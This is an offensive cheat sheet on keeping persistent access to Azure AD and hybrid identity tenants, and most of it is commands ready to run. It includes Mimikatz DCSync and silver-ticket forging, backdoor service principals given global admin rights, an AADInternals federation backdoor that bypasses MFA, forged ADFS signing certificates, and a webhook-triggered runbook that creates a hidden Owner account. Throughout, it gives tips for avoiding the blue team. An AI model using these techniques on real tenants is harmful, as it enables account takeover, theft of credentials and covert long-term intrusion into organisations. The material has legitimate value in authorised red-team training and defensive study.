# Persistence
- It is recommended by Microsoft to join the Azure AD Connect server to the on-prem AD. 
- This means that the persistence mechanisms for on-prem (like Golden Ticket, Silver Ticket, ACL Backdoors and others) that provide us either DA on the on-prem or local admin on the Azure AD connect server will allow to get GA on Azure AD on demand!
  - For PHS, we can extract the credentials
  - For PTA, we can install the agent
  - For Federation, we can extract the certificate from ADFS server using DA

## Hybrid identity - Seamless SSO
- Seamless SSO is supported by both PHS and PTA.
- If seamless SSO is enabled, a computer account AZUREADSSOC is created in the on-prem AD.
- Password/key of the AZUREADSSOACC never changes.

#### Get NTLM hash of AZUREADSSOC account
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\azureadssoacc$ /domain:<DOMAIN> /dc:<DC NAME>"'
```

#### Create a silver ticket
```
Invoke-Mimikatz -Command '"kerberos::golden /user:<USERNAME> /sid:<SID> /id:1108 /domain:<DOMAIN> /rc4:<HASH> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"' 
```

## Add credentials to enterprise applications
#### Check if secrets (application passwords) can be added to all enterprise applications
```
. .\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $graphtoken -Verbose
```

#### Use the secret to autheticate as service principal.
```
$password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<ACCOUNT ID>', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TENANT ID>
```

### Check what resources service principal can access
```
Get-AzResource
```

## Service principal backdoor creation
#### Create a new azure service principal
```
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$spn
```

#### Get service principal secret
```
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
$UnsecureSecret
```

#### set service principal in variable and role
```
$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
$role = Get-MsolRole -RoleName "Company Administrator"
```

## Service principal global admin
- This can be a bit less noticeable as service principal accounts do not show up in the Azure Active Directory “Users” list
-  Blue team should be alerting on new additions to global admins
- Instead of adding to “Company Administrator” just add it to “User Account Administrator” group.

#### Create a new service principal
- Note the “ApplicationId”. This is the service principal’s “username” for auth
```
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$spn
```

#### Get service principal's secret
- this is the password
```
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
$UnsecureSecret
```

#### Get the service principal using the application id
```
sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
```

#### Set the role
```
$role = Get-MsolRole -RoleName "Company Administrator"
```

#### Add the service principal as a role member
```
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
```

#### Check the role members
```
Get-MsolRoleMember -RoleObjectId $role.ObjectId
```

#### Authenticate as service principal
```
$cred = Get-Credential
Connect-AzAccount -Credential $cred -Tenant <Tenant ID> -ServicePrincipal
```

## Federation
### Creating a trusted domain
If we have GA privileges on a tenant, we can add a new domain (must be verified), configure its authentication type to Federated and configure the domain to trust a specific certificate (any.sts in the below command) and issuer.

#### Add a domain with AADInternal
```
Import-Module .\AADInternals.psd1
ConvertTo-AADIntBackdoor -DomainName <DOMAIN>
```

#### Get immutableID of the user that we want to impersonate. Using Msol module
```
Get-MsolUser | select userPrincipalName,ImmutableID
```

#### Access any cloud app as the user
```
Open-AADIntOffice365Portal -ImmutableID <ID> -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA $true
```

### Token Signing Certificate
- With DA privileges on on-prem AD, it is possible to create and import new Token signing and Token Decrypt certificates that have a very long validity. 

#### Create new certs, add them to ADFS, Disable auto reollver and restart the service
```
Import-Module .\AADInternals.psd1
New-AADIntADFSSelfSignedCertificates
```

#### Update the certificate information with AzureAD
```
Update-AADIntADFSFederationSettings -Domain <DOMAIN>
```

## Storage account access keys
- We already know that keys provide root equivalent privileges on an storage account. 
- There are two access keys and they are NOT rotated automatically (unless a key vault is managing the keys). 
- This, of course, provides neat persistent access to the storage account.
- We can also generate SAS URL (including offline minting) using the access keys. 


## Application and service principals
- With privileges of Application Administrator, GA or a custom role with microsoft.directory/applications/credentials/update permissions, we can add credentials (secret or certificate) to an existing application.
- We can also add a new application that has high permissions and then use that for persistence.
- If we have GA privileges, we can create an application with the Privileged authentication administrator role - that allows to reset password of Global Administrators.

#### Sign in as a service principal account
```
$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<ACCOUNT ID>", $passwd) 
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant <ID>
```

#### For certificate based authentication
```
Connect-AzAccount -ServicePrincipal -Tenant <ID> -
CertificateThumbprint <Thumbprint> -ApplicationId <ID>
```

## Illicit Consent Grant
- We can register an application (only for the target tenant) that needs high impact permissions with admin consent - like sending mail on a user's behalf, role management etc.

## Azure VMs and NSGs
- OS level persistence on an Azure VM where we have remote access is very useful. 
- Azure VMs also support managed identity so persistence on any such VM will allow us access to additional Azure resources. 
- We can also create snapshot of disk attached to a running VM. This can be used to extract secrets stored on disk (like SAM hive for Windows). 
- It is also possible to attach a modified/tampered disk to a turned-off VM. For example, add a local administrator!
- Couple this with modification of NSGs to allow access from IPs that we control!

## Custom Azure AD roles
- If we have GA in a tenant, we can modify a custom role and assign that to a user that we control. 
- Take a look at the permissions of the built-in administrative roles, we can pick individual actions. It is always helpful to go for minimal privileges.

## Deployment Modification
-  If we have persistent access to external resources like GitHub repos that are a part of deployment chain, it will be possible to persist in the target tenant. 

## 0365 App passwords
- Use case is for apps that can't use MFA
- Perfect scenario if you phish an account with MFA
- Click "Security & Privacy", Then " Additional security verification", then "Create and manage app passwords"
- Click “Create”, give the app password a name, then copy the value.
- This can now be used to access the account using legacy protocols without the MFA requirement

## Guest user accounts
- By default users can add “guest users” from outside the directory
- This provides (at minimum) read access to the directory
- Hybrid deployments may sync from Azure > On-Prem

## Runbook backdoor with webhook
- Create a new Automation account with “Create Azure Run As Account” enabled
- Navigate to Azure Active Directory > Roles and Administrators> User administrator
- Click Add Assignments • Search for your new automation account and add it
- Navigate to Subscriptions > subscription name > Access control (IAM)
- Click Add Role Assignment and add the automation account as an “Owner”
- Navigate back to Automation Accounts and select your new account
- Click “Modules Gallery”
- Search for “Az.”
- Import the Az.Accounts module
- Import the Az.Resources module
- Now we need to import the actual runbook
- In the Automation Accounts menu click “Runbooks”
- Click “Import a runbook”
- Save the script below as a ps1 file and modify the “user”, “password”, “Nickname”, and “DisplayName” to whatever you want it to be.
```
Import-Module Az.Accounts
Import-Module Az.Resources
$user = “username@targetdomain.com"
$pass = "BackdoorFTW!!"
$Nickname = "BackupSVC"
$DisplayName = "backup_service"
$connectionName = "AzureRunAsConnection"
$servicePrincipalConnection = Get-AutomationConnection -Name $connectionName
Connect-AzAccount -ServicePrincipal -TenantId $servicePrincipalConnection.TenantId -
ApplicationId $servicePrincipalConnection.ApplicationId -
CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint
$SecureStringPassword = ConvertTo-SecureString -String $pass -AsPlainText -Force
New-AzADUser -DisplayName $DisplayName -UserPrincipalName $user -Password $SecureStringPassword -
MailNickname $Nickname
New-AzRoleAssignment -SignInName $user -RoleDefinitionName Owner
```
- When importing the script set a name to something similar to the standard Automation scripts “AzureAutomationTutorial”
- Set “Runbook Type” to PowerShell and click Create
- After the script is imported navigate to the runbook you just created and click “Webhooks” on the left, then Add Webhook
- Now give the webhook a name that will blend in like “backup”
- Make sure you copy the URL!!! This is the most important step.
- Now if the blue team catches you and cuts off your access you have a backdoor.
- All you have to do now is open a PowerShell terminal and run this to create a brand new Azure account that is owner of the subscription
- ```Invoke-WebRequest -Method Post -Uri <Webhook URL>```
